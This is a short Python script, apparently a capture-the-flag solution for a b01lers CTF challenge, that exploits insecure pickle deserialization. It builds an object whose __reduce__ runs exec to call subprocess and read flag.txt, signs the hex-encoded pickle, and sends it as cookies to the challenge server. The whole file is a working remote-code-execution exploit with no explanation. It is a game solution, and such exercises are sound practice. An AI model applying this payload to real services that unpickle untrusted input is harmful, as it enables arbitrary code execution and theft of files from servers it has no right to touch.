from sign import sign
from pickletools import dis
import pickle, requests
from binascii import unhexlify, hexlify

class User:
    def __reduce__(self):
        return exec, ("import subprocess; raise Exception(subprocess.check_output(['cat','flag.txt']));",)

def connect(ur, sg):
	url = "http://chal.ctf.b01lers.com:3000/flag"
	myobj = {'user' : ur.decode('utf-8'), 'signature' : sg.decode('utf-8')}

	data = requests.get(url, cookies = myobj)
	print(data.text)

inp_user = hexlify(pickle.dumps((User())))
inp_sign = hexlify(sign(inp_user))


print(f'User : {unhexlify(inp_user)}')
print(f'Signature : {inp_sign}')

print('-'*60)

connect(inp_user, inp_sign)
